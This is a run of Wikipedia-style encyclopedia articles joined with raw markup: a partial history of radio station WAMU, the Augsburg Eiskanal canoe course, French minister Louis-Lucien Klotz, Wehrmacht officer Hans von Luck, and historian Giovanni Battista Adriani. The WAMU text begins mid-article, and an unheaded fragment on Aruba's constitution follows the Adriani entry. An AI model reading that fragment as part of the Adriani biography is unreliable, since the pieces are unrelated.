Throughout the late 1950s, students and faculty involved with WAMU-AM pushed to create an FM station that could reach beyond campus and serve Washington, D.C., as a whole. In late 1960, the university received a non-commercial FM broadcasting license, and WAMU made its first FM broadcast on October 23, 1961, on using a 4,000-watt second-hand transmitter acquired from WGBH in Boston. Although it was not strictly necessary as the AM carrier-current station&#x27;s call sign was not official, the FM station took the suffixed call sign &quot;WAMU-FM&quot; to differentiate itself. The station dropped the -FM suffix in 1981.

WAMU-FM station was established as an &quot;education station&quot; operated by the university, not as a student-run station. Despite this about 75 AU students, many of whom also worked at the carrier-current station, produced local programming for WAMU-FM. In its first year of operation, WAMU simulcast the same programming, which included educational programs, dramas, and classical music, on AM and FM for three hours each evening.

From its inception as a student-run station, WAMU provided public affairs and educational programming. With the launch of its FM service in 1961, WAMU joined the nascent National Educational Radio Network, a predecessor to NPR. In 1971, the station was a founding member of National Public Radio.

In 1967, WAMU-FM began programming bluegrass music which, in its heyday on the main channel, included the &quot;Lee Michael Demsey Show&quot; and the &quot;Ray Davis Show&quot; and weekends included &quot;Stained Glass Bluegrass&quot; and West Virginia Public Radio&#x27;s &quot;Mountain Stage&quot;. The station hosted an annual bluegrass concert at Fairfax High School, as well as the yearly &quot;Pickin&#x27; in the Glen&quot; concert, featuring performers such as Alison Krauss, Tony Rice, the Gibson Brothers, the Lewis Family, Hot Rize, and Red Knuckles and the Trailblazers. However, starting in the late 1990s, the station began paring back its on-air bluegrass programming in favor of news/talk programming. In summer 2001, the station fully transitioned its weekday programming to all news and public affairs from various providers including NPR, PRI, APM and the BBC World Service, and in September 2007 the station removed the last of its bluegrass programming from its main channel, shifting it all to the HD2 subchannel.

On May 7, 2004, WAMU-FM began digital broadcasting using the HD Radio standard and launched the Americana-music station &quot;Bluegrass Country&quot; on its HD2 subchannel. The station also operated for several years an HD3 service, WAMU-3, broadcasting a mix of talk and music programming, including simulcast programming from Towson University&#x27;s WTMD.

Also in 2004, the prominent Washington journalist Ellen Wadley Roper left WAMU a $250,000 bequest, the largest gift in the station&#x27;s history.

When fellow public radio station WETA returned to an all-classical music format in 2007, WAMU became Washington, D.C.&#x27;s only full-time public news station, ending two years of competition between the stations for D.C.&#x27;s NPR news audience.

In December 2015, WAMU executives announced that long-time program host Diane Rehm, who began working at WAMU in 1973, would be stepping down from her show following the 2016 Presidential election, representing a major shake-up in WAMU&#x27;s programming lineup. Rehm, then 79, stated that she wanted a younger voice to take her place at WAMU. Also in 2015, Kojo Nnamdi lost the local public affairs program &quot;The Kojo Nnamdi Show&quot;&#x27;s second hour of broadcasting, showing a trend for easier-to-access media for younger consumers. In 2021, Nnamdi retired his daily program although he continued to host the weekly &quot;The Politics Hour&quot; program with analyst Tom Sherwood.

In February 2018, it was announced that WAMU, KPCC and WNYC had bought the archives of Gothamist, and WAMU would resume the publication of local Washington news site &quot;DCist&quot; in Spring 2018. WAMU relaunched &quot;DCist&quot; on June 11, 2018. WAMU shut down &quot;DCist&quot; and laid off all its journalists on February 23, 2024. Initially, WAMU added a redirect from the &quot;DCist&quot; website to the WAMU homepage which blocked access to all &quot;DCist&quot; articles. However, following public criticism, WAMU restored access to the &quot;DCist&quot; website and stated they will continue to make it &quot;available to the public for at least a year as it seeks a long-term home for the archive&quot;.

==Technical facilities==
In 2013, WAMU moved to a new studio facility at 4401 Connecticut Ave. NW in the Forest Hills/Van Ness neighborhood of Washington, D.C. The facility was constructed with three broadcast studios, two news studios with dedicated control rooms, multiple editing suites, and a 90-seat black box theater capable of supporting broadcasts before a live studio audience. In total the five-floor WAMU media center supports 21 broadcast and production studios and control rooms and a technical core, as well as 12 conference rooms and community spaces. The IP-based studio infrastructure at the facility helped ensure WAMU staff could work remotely throughout the COVID-19 pandemic.

In October 2019, the station launched a major tower renovation and antenna replacement project for its tower on the American University campus. The improvents were designed to improve reception in Northern Virginia and parts of Maryland. During the project, WAMU broadcast from an auxiliary site in Arlington, Virginia. The WAMU antenna also serves WTOP, WPFW, and WETA; the tower also hosts auxiliary antennas for WPGC and WMMJ.

Prior to the station&#x27;s move to Connecticut Avenue, WAMU operated for about two decades from two floors of an office building in Tenleytown near the AU campus that at one point housed the East German embassy. Before that, the station was housed on the AU campus next to its tower.

==Programming==
WAMU&#x27;s main channel carries content from NPR, American Public Media, Public Radio International, and Public Radio Exchange. The station&#x27;s weekday schedule is largely made up of NPR staples &quot;Morning Edition&quot;, &quot;All Things Considered&quot;, &quot;Here and Now&quot;, &quot;The Takeaway&quot;, and &quot;Fresh Air&quot;. , WAMU produces one daily program, &quot;1A&quot;, which NPR distributes nationally. The station also airs &quot;This American Life&quot;. A relay of the BBC World Service is heard overnight and in the 9 a.m. slot on weekdays.

WAMU breaks from its general all-news and talk schedule only on weekend nights, which it devotes to entertainment programming; Sunday nights are given to &quot;The Big Broadcast&quot;, which originated in 1964 as &quot;Recollections&quot;. This program, which airs for four hours, features rebroadcasts of drama, comedy, and variety shows from the &quot;golden age of radio&quot;, including &quot;The Jack Benny Show,&quot; &quot;Dragnet,&quot; &quot;Gunsmoke,&quot; &quot;The Great Gildersleeve,&quot; &quot;Lux Radio Theater,&quot; and &quot;Philco Radio Time&quot; with Bing Crosby. Ed Walker, himself a storied Washington broadcaster, served as the program&#x27;s host from 1990 to 2015. On Saturdays, the station broadcasts &quot;Hot Jazz Saturday Night&quot;, which features popular music from the swing era and debuted in 1980. The show, which became a Saturday night staple with a loyal audience over the years, was first cancelled in 2018. Amid listener protests, WAMU management stated at that time that music was increasingly becoming out of place on the station&#x27;s schedule, and cited listener surveys showing a desire for more news programming on weekends; after this change, a delayed broadcast of &quot;Live from Here&quot; was the only remaining music program on WAMU&#x27;s schedule. After the cancellation of &quot;Live From Here&quot; opened up two hours in the Saturday night schedule, WAMU returned Hot Jazz Saturday Night in September 2020.

==Bluegrass Country==
WAMU&#x27;s HD2 subchannel broadcasts bluegrass music under the branding &quot;Bluegrass Country&quot;. Bluegrass has a long history on WAMU, which included regular bluegrass programming on its main channel from 1967 to 2007. In 2001, WAMU launched Bluegrass Country as an internet stream, and in 2007 it launched Bluegrass Country on WAMU-HD2 as an all-bluegrass HD Radio digital subchannel.

In July 2016, WAMU announced it would shut down Bluegrass Country for financial reasons that December 31, unless it could find a buyer for the station and access to its HD2 channel. At the time, WAMU was losing $250,000 per year on the station. Listeners created the nonprofit Bluegrass Country Foundation, and after an extension of negotiations, the foundation took over operations in January 2017. WAMU included access to its HD2 subchannel for at least two years.

Bluegrass Country also aired on FM via independently owned translator W288BS () from Reston, Virginia, until June 2017, when the owner elected not to renew his contract with the channel and replaced it with Radio Sputnik.

Bluegrass Country Radio now airs on WAMU&#x27;s HD2 subchannel and online, as well as via iOS and Android apps. Programming currently includes &quot;Stained Glass Bluegrass, the Chris Teskey Show&quot; and the &quot;Dick Spottswood Show&quot;.

==Former repeaters==
From summer 2010 to June 2021, WAMU operated a 50,000-watt Class B Eastern Shore relay service on WRAU licensed to Ocean City, Maryland, with its transmission facilities in Whaleyville. WRAU carried local content, such as news, traffic, and weather, along with simulcasts of WAMU&#x27;s main channel programming. By 2017, WRAU was considered the primary NPR news source for listeners in central Delmarva.

Citing a desire to focus on its core Washington-market, WAMU in 2020 began seeking to sell off WRAU/88.3; according to the station, WRAU makes up about 2 percent of WAMU&#x27;s total weekly listenership. In February 2020, WAMU reached an agreement with Delaware Public Media for the sale of WRAU; however, the broadcasters unwound the deal in October 2020, citing economic changes due to the COVID-19 pandemic.

In March 2021, WAMU announced the sale of the station to Atlantic Gateway Communications, owner of Takoma Park, Maryland-based WGTS. WGTS plans to use WGTS as a repeater service for its contemporary Christian programming. The station handover happened on June 24, 2021, with the station being reassigned as WGBZ.

From 2014 to 2017, WAMU operated a second repeater, the 8,000-watt Class B1 WYAU on licensed to Spotsylvania Courthouse, Virginia, serving the Fredericksburg area. The station was sold in December 2017 to the Educational Media Foundation, which relaunched it as WLJV.

==WVAU==
The student-run WAMU carrier-current station continued operating on AM and in 1979 attempted to convert to a licensed FM station. To prepare for the move, the station rebranded as WVAU, &quot;The Voice of American University.&quot; WVAU began testing operation on in 1985, using a series of experimental low-power FM transmitters designed to limit reception to residence halls. While these plans were abandoned, it eventually started operation on cable FM, also on 101.7 and branded &quot;Eagle 102&quot;, in 1988. WVAU shut down in 1997, resurfacing as an internet-only station in 2001.

WVAU is completely student run and is part of American University&#x27;s Student Media Board. The station operates from studios in the Mary Graydon Center on the AU campus with about 100 student DJs. In 2014–15, the station produced a series of live, in-studio compilation albums, &quot;Live in the Hive,&quot; featuring local and touring artists. In 2014, WVAU was named best student-run, internet-only station by &quot;CMJ&quot;.

<text>The Augsburg Eiskanal is an artificial whitewater river in Augsburg, Germany, constructed as the canoe slalom venue for the 1972 Summer Olympics in nearby Munich.

The first artificial whitewater course of its kind, it introduced the sport of canoe slalom (using decked canoes and kayaks) to the Olympic Games. However, because of the expense of building artificial rivers and supplying them with water, canoe slalom was missing from the next four Summer Olympics. It returned with the 1992 Olympic Games in Barcelona, and has been featured in every Summer Olympics since then.

The Eiskanal has thus served as the prototype for six Olympic whitewater venues, from 1992 through 2012, and for more than fifty training and competition facilities in eighteen countries (see list). Despite being the oldest, it is still one of the most widely used, hosting two World Championships and numerous World Cup races. It was a World Cup venue for all but four of the years 1990 through 2010, and it was so again in 2013 and 2014.

The facility and its website are jointly managed by two clubs with headquarters in the boat house, Augsburger Kayak Club eV and Canoe Schwaben Augsburg.

==History==

The Hochablass (High Drain) dam on the north-flowing Lech river south of Augsburg dates back to 1647. It was most recently rebuilt in 1911-1912. The dam diverts river water into the Hauptstadtbach (Capital Creek) which branches into the many canals of the Augsburg Lech district as it flows through the town. In medieval times, the canals were used for drinking water, water wheel operation, and sewage disposal. In 1875, in order to collect drinking water from the upstream end of the system, a water collection and filtration plant was built straddling a new bypass branch of Capital Creek, near the dam. (In 2007 it was decommissioned and converted into a waterworks museum and a small hydro power station.) The original channel became known as the Eiskanal (ice channel), since it was used to deflect floating ice away from the waterworks facility, protecting its equipment.

By the 1950s, the Eiskanal was already in use as a canoe slalom venue, but its slope was much less than that of the mountain streams commonly used in the sport. When the 1972 Olympic Games were awarded to Munich, a plan was devised to create a much steeper artificial whitewater rapid by constructing a 300-meter-long channel connecting the Eiskanal section of Capital Creek directly back to the Lech river. The 1971 construction cost was 14.9 million Deutsche Marks, equivalent to $24.5 million US (2013). For the 1972 Olympics, this new channel was only the bottom half of a 660-meter race course; the top half was in the old Eiskanal, starting above the boat house near the dam. Since the standard length of a canoe slalom course was later reduced to 250 to 300 meters, major races are now held entirely within the 1971 channel. Nonetheless, the entire sports complex goes by the name Eiskanal.

To prepare for the 1972 Olympics, East Germany&#x27;s team constructed a secret copy of the Eiskanal on the Zwickau Mulde river in the Cainsdorf district of Zwickau. The training there, on the world&#x27;s only other artificial rapid, was so successful that East German paddlers won all four Olympic gold medals in canoe slalom, the only time that has ever happened. The ruins of the long-abandoned, overgrown canal can still be seen in satellite photographs at .

==Design==

Using a technique which has never been duplicated, the streambed of the Eiskanal canoe slalom channel was made of sculpted concrete, with simulated boulders being an integral part of the uneven channel floor. This feature is easily seen in photographs of the channel without water. The shapes were planned using water flowing through a 25-meter-long scale model made of sheet metal. Most of the simulated boulders are attached to the channel walls, but two stand alone in the middle of the channel. Five barn-door water deflectors, hinged to the channel sides, can be swung in or out to change the water flow at those locations.

An underwater weir at the top can be raised to block most or all of the flow into the slalom channel from Capital Creek. At the bottom, a stationary weir creates a take-out pool. A pedestrian bridge on top of the weir supports a strainer that keeps people and boats from washing over. The strainer is slanted toward the river so anything that washes against it is pushed up rather than down.

Six names have been given to sections of the channel. The turbulent water between the first drop and the first rock island is called Waschmaschine, or Washing Machine. Where the channel narrows and drops at the pedestrian bridge is Bogenbrücke, or Arch Bridge. It has a pair of hinged water deflectors to further narrow the channel, if desired. The rock island below the bridge is called Moby Dick, after the fictional whale. At the last of the hinged deflectors, on the left wall, the right half of the channel is a pour-over. The wave at the pour-over is called Korkenzieher, or Corkscrew. The turbulent right bend in the channel between there and the road bridge is Karussell, or Carousel. Another pour-over wave under the bridge, on the left side, is called Torpedowalze, or Torpedo Hole. After the road bridge, the course flattens out, and racers sprint to the finish line.

<doc id="1341322" wikidata="Q179586" url="?curid=1341322" title="Louis-Lucien Klotz">
<text>Louis-Lucien Klotz (11 January 1868 – 15 June 1930) was a French journalist and politician. He was the French Minister of Finance during World War I.

==Early life==

Klotz was born in Paris to Alsatian Jewish parents. He was the nephew of Victor Klotz (1836–1906), a wealthy silk dealer. After completing his legal education, he enrolled as an advocate at the &quot;Cour d&#x27;Appel&quot; in Paris. In 1888, at the age of twenty, he founded &quot;Vie Franco-Russe&quot;, an illustrated paper intended to increase popular support for the Franco-Russian Alliance. In 1892 he became editor of &quot;Le Voltaire&quot;, and campaigned against the reactionary policy of Jules Ferry. In 1895, he founded &quot;Français Quotidien&quot;, a patriotic daily paper devoted to national defense, into which &quot;Voltaire&quot; was later merged.

==Political career==

Klotz was an unsuccessful candidate for the National Assembly from his Paris district in the 1893 election. He ran for office and lost again a few years later. Then in the 1898 election, he ran for the Assembly from Montdidier as a Radical Socialist. This time, he was elected by an overwhelming majority. He retained this seat until 1925.

He was noted for his industry as a deputy and in government posts. He served as president of the Customs Commission, then as Rapporteur General of the budget. He held the following prominent ministerial posts:

* Minister of Finance, 3 November 1910 – 2 March 1911, in the second government of Aristide Briand. During this time he submitted a motion in favour of women&#x27;s right to vote to the conseil général de la Somme. Drafted by Marie Denizard, it was adopted unanimously on 30 September 1910.
* Minister of Finance, 27 June 1911 – 22 March 1913, in Briand&#x27;s third government.
* Minister of the Interior, 22 March-8 December 1913, in the government of Louis Barthou. At this time, there were large protests and demonstrations against the &quot;Three Years Law&quot; for military conscription.
* Minister of Finance, 12 September 1917 – 20 January 1920, in the second government of Georges Clemenceau. He was responsible for negotiating reparations from Germany. His policy was characterised by his famous formula: &quot;The Boche will pay!&quot; His efforts were motivated by his concerns over France&#x27;s growing budget deficit and subsequent inflation.

==Personal life==
In 1924, Klotz published his memoirs of this period, &quot;De La Guerre à La Paix&quot; (&quot;From the War to the Peace&quot;).

Klotz was a member of several civic and charitable societies, including the Society for the Defense of Children, the Prison Society and the Central Committee for Labour.

==Conviction and death==

After his retirement, he became involved in dubious and risky financial speculations and lost all his money. In 1929, he was convicted of passing bad checks and sentenced to imprisonment for two years. He died less than a year later. With no further hope of settlement, his creditors seized his Paris residence at 9 Rue de Tilsitt, which he had inherited from his brother.

His lack of financial acumen was noted years earlier by Clemenceau, who reportedly commented &quot;My finance minister is the only Jew in Europe who knows nothing about money.&quot;

<doc id="1341324" wikidata="Q64667" url="?curid=1341324" title="Hans von Luck">
<text>Hans–Ulrich Freiherr von Luck und Witten (15 July 1911 – 1 August 1997), usually shortened to Hans von Luck, was a German officer in the Wehrmacht of Nazi Germany during World War II. Von Luck served with the 7th Panzer Division and 21st Panzer Division. Von Luck is the author of the book &quot;Panzer Commander&quot;.

==Early life and interwar period==
Luck was born in Flensburg, into a Prussian family with old military roots. Luck&#x27;s father, Otto von Luck, served in the Imperial German Navy and died in July 1918 of an influenza virus. His mother remarried a Reichsmarine Chaplain. In 1929, Luck joined the &quot;Reichswehr&quot; (army). Through the winter of 1931−1932, Luck attended a nine-month course for officer cadets, led by then Captain Erwin Rommel, at the infantry school in Dresden. On 30 June 1934 Luck&#x27;s unit took part in the Night of the Long Knives, arresting several &quot;Sturmabteilung&quot; (SA) members in Stettin. In 1939 Luck was posted to the 2nd Light Division, serving in its armoured reconnaissance battalion.

==World War II==
===Invasions of Poland and France===
On 1 September 1939 the 2nd Light Division, under General Georg Stumme, participated in the invasion of Poland. Luck served as a company commander in the division&#x27;s reconnaissance battalion. The division was reorganized and reequipped to form the 7th Panzer Division, with Rommel assuming command on 6 February 1940. Luck served as a company commander in an armoured reconnaissance battalion.
The 7th Panzer Division was a part of the XV Army Corps under General Hermann Hoth in Army Group A. On 10 May 1940, the division participated in the invasion of France. Luck&#x27;s reconnaissance battalion led the division&#x27;s advance into Belgium, reaching the Meuse in three days. In his memoir Luck describes the division&#x27;s crossing of the Meuse and Rommel&#x27;s active role in gaining the crossing. On 28 May, Luck was appointed commander of the reconnaissance battalion. Luck&#x27;s unit advanced through Rouen, Fecamp, and Cherbourg. In February 1941 Rommel was replaced by General Freiherr von Funk, and in June Luck moved with his division to East Prussia in preparation for the invasion of the Soviet Union.

===Invasion of the Soviet Union===

Luck was made &quot;Hauptmann&quot; and attached to the 7th Panzer Division&#x27;s headquarters staff. His division was a part of the 3rd Panzer Group of Army Group Center. In this capacity he participated in the Operation Barbarossa, the invasion of the Soviet Union. The 7th Panzer Division spearheaded the 3rd Panzer Group as it drove east and captured Vilnius in Lithuania, before driving on Minsk to form the northern inner encirclement arm of the Bialystok-Minsk pocket. Following the capture of Minsk the armoured group continued east towards Vitebsk. At Vitebsk, Luck was assigned as commander of the division&#x27;s reconnaissance battalion.

The division participated in creating the large pocket around Smolensk, cutting the Smolensk–Moscow road. Luck and his unit continued on towards Moscow. In his memoirs, he describes the stiffening Soviet resistance and problems the German forces faced relating to weather and road conditions. Since November Rommel had requested Luck be transferred to Africa to take over command of one of his reconnaissance battalions. The transfer was approved in late January once the crisis of the Soviet winter offensive had passed.

===North Africa===

Luck was promoted to major, spending February and March 1942 on leave. Reporting back for duty on 1 April 1942, he reached Africa on 8 April and assumed command over the 3rd Panzer Reconnaissance Battalion of the 21st Panzer Division. Luck spent June to mid-September in Germany, recuperating from a combat wound. Returning to Africa, he resumed command of the 3rd Reconnaissance Battalion.

On 23 October 1942, the British launched the attack of the Second Battle of El Alamein. The Axis position deteriorated leading to a retreat. Luck was one of Rommel&#x27;s most experienced commanders, and he called upon Luck&#x27;s reconnaissance battalion to screen his withdrawal. By December the Axis forces had retreated to Tripoli. On 6 May the forces in Africa surrendered, with more than 130,000 Germans taken prisoner. By that time Luck was in Germany.

===The Normandy invasion===

After North Africa and leave in Berlin, Luck was assigned in August 1943 as an instructor at a panzer reconnaissance school in Paris. In March 1944 he was to be appointed as commander of a panzer regiment in the new &quot;Panzer Lehr&quot; Division in France under Fritz Bayerlein. However, in mid-April he was told by Bayerlein that as Feuchtinger apparently had more influence at Headquarters he was to serve under Feuchtinger. 

Luck was assigned to the 21st Panzer Division, stationed in Brittany and commanded by Edgar Feuchtinger. In early May, Luck was placed in command of the 125th Panzer Grenadier Regiment. Luck&#x27;s regiment was stationed at Vimont, southeast of Caen, with two companies of assault guns in support.

On 6 June 1944, the invasion of Normandy started. During the night Luck was startled by the reports of paratroopers landing in his area, and establishing a bridgehead on the east side of the Orne River. Luck requested permission to attack, but Feuchtinger, the 21st Panzer Division&#x27;s commander, refused to allow him to do so, citing strict orders not to engage in major operations unless cleared to do so by the high command. Apart from an order at 4:30 a.m. directing other elements of the division to move against the paratroopers of the British 6th Airborne Division, the 21 Panzer Division remained mostly motionless. As the morning wore on, the defenders on the coast were overcome and the British beachheads secured.

Around 10:30 a.m. General Erich Marcks, commander of the German LXXXIV Corps to which the 21st Panzer Division was attached, ordered the entire 21st to leave a single company from the division&#x27;s 22nd Panzer Regiment to deal with the paratroopers and move the rest of the division to attack the British forces advancing from the beachhead toward Caen. Feuchtinger finally ordered his division forward, leaving a company of panzers as ordered, but also leaving Luck&#x27;s 125 Panzergrenadier Regiment. This order was later countermanded, this time from 7th Army, and only Luck&#x27;s detachment was left to attack the paratroopers east of Orne. The confusion and inflexibility of the German command situation markedly delayed the German response. Nevertheless, at 1700 p.m. Luck attempted to break through to the Orne river bridges at Bénouville with his armoured personnel carriers, but heavy fire from the warships supporting the British paratroopers, under Major John Howard, holding the bridges drove his forces back. Added to this, more British paratroopers landed in the rear area of the regiment, causing some of Luck&#x27;s forces to fall back.

On the morning of 9 June Luck&#x27;s command was designated &quot;Kampfgruppe von Luck&quot;, and in addition to the elements of the 125th Panzer Grenadier Regiment already under Luck&#x27;s command, it consisted of a battalion, three assault-gun batteries and one antitank company with 88mm guns. With this force, Luck was tasked with assaulting the Orne bridges, and recapturing them from the British paratroopers. Starting one hour before dawn to avoid the worst of the British naval and aerial support, the &quot;Kampfgruppe&quot; advanced on the village of Ranville, dislodging the enemy there, but it could not penetrate the British lines to reach the bridges. The British paratroopers, reinforced by the British 51st (Highland) Division and the 4th Armoured Brigade, then attempted to advance around the eastern edge of Caen as the left side of an envelopment attack, but their efforts were thwarted by Luck&#x27;s unit. Over the next several days Luck&#x27;s group initiated what amounted to a spoiling attack, tying up the British units. On 12 June &quot;Kampfgruppe von Luck&quot; engaged in the fighting for the village of Sainte-Honorine, lying on a hill overlooking the invasion beaches. The British forces east of the Orne were unable to move forward until 16 June.

====Operation Goodwood====

At the beginning of July, the area defended by Luck&#x27;s &quot;Kampfgruppe&quot; came under the control of I SS Panzer Corps under the command of &quot;Obergruppenführer&quot; Sepp Dietrich. Nearby was the Heavy Tank Battalion 503 equipped with one company of Tiger II tanks and two companies of Tiger I tanks. On 18 July, Field Marshall Bernard Montgomery launched Operation Goodwood; an operation aimed to wear down the German armoured forces in Normandy in addition to seizing territory, on the eastern flank of Caen, to the extent of the Bourguébus–Vimont–Bretteville area. If successful, the British hoped to follow this limited attack by pushing reconnaissance forces south towards Falaise. The offensive opened with a massive aerial bombardment, followed by artillery and naval gunfire, intended to suppress or destroy all defences in the path of the attack.

During the morning, Luck had just returned from a three-day leave in Paris. Informed of the air raids, he moved forward to determine the exact situation and soon realized that a major offensive was underway. The air raid had neutralized the remnants of the 16th Luftwaffe Field Division, which held the front line, as well as elements of the 21st Panzer Division (in particular, elements of the 22nd Panzer Battalion and the 1st battery of Assault Gun Battalion 200) leaving a hole in the German defensive line. While elements of the advancing British 11th Armoured Division were held up in an engagement with self-propelled guns of the 200th Assault Gun Battalion, the 2nd Fife and Forfar Yeomanry advanced past Cagny. As the regiment did, they came under heavy anti-tank fire resulting in the loss of four tanks.

After the war, Luck wrote that he was responsible for this barrage of anti-tank fire, saying that he used his sidearm to threaten a Luftwaffe officer into action, to fire upon the advancing tanks with 88 mm flak guns. Luck&#x27;s account has been widely repeated, although competing theories have also been suggested: The British 8 Corps history states that German anti-tank guns based in Soliers, which had escaped the aerial bombardment, were responsible.

Ian Daglish, critical of Luck&#x27;s account, stated &quot;there turns out to be surprisingly little&quot; evidence to support Luck&#x27;s version of events, and that all accounts of 88 mm flak guns in Cagny being used in an anti-tank capacity &quot;can be traced directly to Luck and no one else.&quot; He further wrote that neither the commander of the 200th Assault Gun Battalion nor the commander of Luftwaffe flak guns made any comment in regards to this action and that based on locations of flak positions, it was illogical for a heavy flak battery to have been located there. Daglish also wrote that Luck&#x27;s account of the placement of the guns &quot;is imprecise&quot; and &quot;expert analysis of aerial photographs of the area taken at midday ... reveals no trace of [the battery] nor of any towing vehicles or their distinctive tracks&quot;. Such weapons and vehicles &quot;could not be hidden within a mere couple of hours of relocation&quot;. Daglish argued that Luck embellished his role during post-war official British tours of the battlefield, with his version of events eventually coming into question (off the record). Daglish wrote that elements of the 200th Assault Gun Battalion were in the area and that any number of German anti-tank guns could have fired on the 2nd Fife and Forfar and that 88 mm anti-tank guns were deployed to the Cagny area throughout the day. John Buckley is also critical of Luck&#x27;s account, and called it &quot;colourful and enthralling&quot;. He argued that despite there being &quot;no doubt that heavy anti-tank gunfire from in and around Cagny began to account for British tanks&quot;, no evidence that the Luftwaffe had guns in Cagny at the time given the dispositions of other Luftwaffe batteries. Buckley wrote that Luck had embroidered his role.

Stephen Napier reassessed these criticisms of Luck&#x27;s account. He wrote that &quot;heavy anti-aircraft guns were located in the outlying villages of Caen&quot; and &quot;photographic evidence of the Luftwaffe batteries in the area exists&quot;, in addition the wreckage of three 88mm guns was found by the Guards division that afternoon in Cagny, which would corroborate Luck&#x27;s claim to have ordered the destruction of the guns upon abandoning Cagny. Napier wrote that Luck&#x27;s account of threatening a Luftwaffe officer is plausible given that &quot;88mm anti-aircraft crews did not expect to become embroiled in fighting as per III Flak Korps policy, and their direct involvement occasionally took some persuasion.&quot; Napier also asserts that the timeline of Luck&#x27;s stated confrontation with the Luftwaffe battery commander, just after 09:00 hours, correlates with the losses the 2nd Fife and Forfar Yeomanry at 09:30 hours since a &quot;88mm flak battery would only need about 15 minutes to relocate a short distance&quot;. Napier further writes that the fact that two Tiger tanks were destroyed by German friendly fire &quot;suggests the actions of an inexperienced Luftwaffe crew&quot; unable to identify retreating German tanks. According to Napier the 75mm Pak 40 anti-tank guns were incapable of the clean armour penetrations found on the Tigers at that range and the only other alternative unit that could have engaged the British tanks was Becker&#x27;s 4th Battery located in Le Mensnil Frementel. Napier notes &quot;if this company did not move before 0930 hours, it would have been cut off when the leading tanks of the 29th brigade crossed the railway&quot; and reasoned &quot;since the battery &quot;Was able to relocate successfully to just south of Four where it was in action for the rest of the day and so must have moved well before 0930 hours.&quot; Napier stated that an officer of the 2nd Fife and Forfar wrote in his memoirs &quot;of his surprise at seeing a German officer in dress uniform surveying the battlefield from Cagny&quot;. Napier concluded that Luck &quot;correctly attributed credit where it was due and his only sin is the assumption of a mantle previously worn by Rommel who stopped the British tank attack at Arras in 1940 by ordering the 88mm flak guns to engage the ground targets of the British tank forces.&quot;

Luck spent the rest of the day using the resources he had to check the gaps in the line. In the afternoon, the first elements of the 1st SS Division Leibstandarte SS Adolf Hitler had moved up in support and the situation was somewhat stabilized. The following day, Luck&#x27;s &quot;Kampfgruppe&quot;, supported by the armour of the 1st SS, held the British in check, and launched counterattacks on the British flanks. The British attack ended on 20 July. In the evening, the 12th SS Panzer Division Hitlerjugend relieved Luck&#x27;s men. For his service during Operation Goodwood, Luck was awarded the Knight&#x27;s Cross of the Iron Cross, and on 8 August, he was promoted to the rank of lieutenant colonel.

====The Falaise Pocket and Retreat to Germany====

A week later, after a brief rest and refit, the 21st Panzer Division was sent to the Villers-Bocage area south of Bayeux. On 26 July Panzer Lehr&#x27;s lines were broken, and the 21st Panzer Division reoriented themselves on this new threat. On 31 July General Patton&#x27;s forces broke through at Avranches into open country. The German motorized forces were brought west to counterattack in an effort to cut the supply and communication lines of the advancing American forces, but the counterattack was known due to Ultra decrypts and the attacking formations were heavily shelled and bombarded, stopping the attack before it could jump off. Unable to check the advancing American armour, all the German divisions in Normandy were in danger of being encircled.

Luck reached Falaise after two weeks of delaying action. On 17 August a British attack split the 21st Panzer Division, leaving half inside the now emerging Falaise Pocket, while Luck&#x27;s command found itself on the outside. &quot;Kampfgruppe von Luck&quot; was now tasked with holding the Western end of the gap open, which it did until 21 August. About half of the 100,000 trapped troops managed to escape, though most of the heavy materiel and vehicles were destroyed in the pocket. A new threat was already emerging, with Patton threatening to create yet another pocket, south of the Seine River. Luck was put in command of the remains of 21st Panzer Division.

====The Defence of Germany====

On 9 September, Luck&#x27;s command reached Strasbourg, where it was attached to General Hasso von Manteuffel&#x27;s Fifth Panzer Army. During the Battle of Dompaire which was fought a few days later, the 112 Panzer Brigade suffered heavy tank losses. Luck attempted to salvage a desperate situation but ended up having to retreat in order to conserve his forces. In January 1945, when the division was moved to the Oder front, the division took part in fighting along the Reitwein Spur. Luck surrendered to the Soviet forces while attempting a breakout from the Halbe pocket on 27 April 1945.

==After the war==

After the war, Luck was interned at GUPVI forced labour camp 518/I in Tkibuli, Georgia, a camp for POWs and internees, similar to a GULAG camp. He was released in December 1949 and returned to West Germany. He became involved in veterans&#x27; associations and was frequently asked to lecture at military schools. He spoke annually for the British Staff College during their summer tours of the Normandy battlefields, and subsequently was asked to speak at a number of other military seminars. He was a participant in the UK&#x27;s Ministry of Defence Army Department film presentation on Operation Goodwood Lectures.

Through his involvement as a speaker at military lectures he came to be good friends with several of his former adversaries, including Brigadier David Stileman, Major Alastair Morrison of the 4th/7th Royal Dragoon Guards, and Major John Howard of the British 6th Airborne Division. He also formed a friendship with popular historian Stephen Ambrose, who encouraged him to write his memoirs, which was titled &quot;Panzer Commander&quot;.

Hans von Luck died in Hamburg on 1 August 1997 at the age of 86.

<text>Giovanni Battista Adriani (1511 or 15131579) was an Italian historian.

==Life==
He was born in 1511 or 1513, in Cherasco, into a patrician Florentine family. His father, Marcello Virgilio Adriani (died 27 November 1521), was a professor of literature, and served as the chancellor of the Republic. In 1538, he joined the Order of Clerics Regular of Somasca and soon became a teacher of philosophy and theology. From 1546 to 1553, he was a professor of history and geography at &quot;Collegio-Convitto di Casale&quot;.

Giovanni Battista was secretary to the Republic of Florence. He was among the defenders of the city during the siege of 1530, but subsequently joined the Medici party and was appointed professor of rhetoric at the university.

At the instance of Cosimo I he wrote in Italian a contemporary history, spanning from 1536 to 1574, which is generally considered a continuation of Guicciardini chronicles, although the historian Brunet finds this notion erroneous. This &quot;Istoria dei suoi tempi&quot; was published in Florence in 1583; a new edition appeared also in Florence in 1872. De Thou acknowledges himself greatly indebted to this history, praising it especially for its accuracy.

Adriani also composed funeral orations in Latin on the emperor Charles V and other noble personages, and was the author of a long letter on ancient painters and sculptors prefixed to the first volume of Vasari.

Giovanni Battista&#x27;s son, named Marcello, born 1533 became a professor of rhetoric at the Accademia Fiorentina. He edited and translated a number of classic texts, including the &quot;Trattato dell&#x27;elocuzione&quot; by Demetrius of Phalerum.

The Constitution is based on democratic Western principles and provides for a governor, (appointed by the King of the Netherlands) for a six-year term, as the monarch&#x27;s representative. An elected prime minister heads the local government and receives legislation from the eight-member Council of Ministers. The Parliament of Aruba has legislative powers. Judicial powers are carried out by the common court, the Justice Court of Aruba, and at the Supreme Court of the Netherlands

Aruba Constitution was approved unanimously on August 9, 1985, and was proclaimed on August 19, 1985

On January 1, 1986, Aruba gained &quot;Status aparte&quot; and became a constituent country within the Kingdom of the Netherlands, which now consists of the four constituent countries: Aruba, Curacao, St. Maarten and the Netherlands.

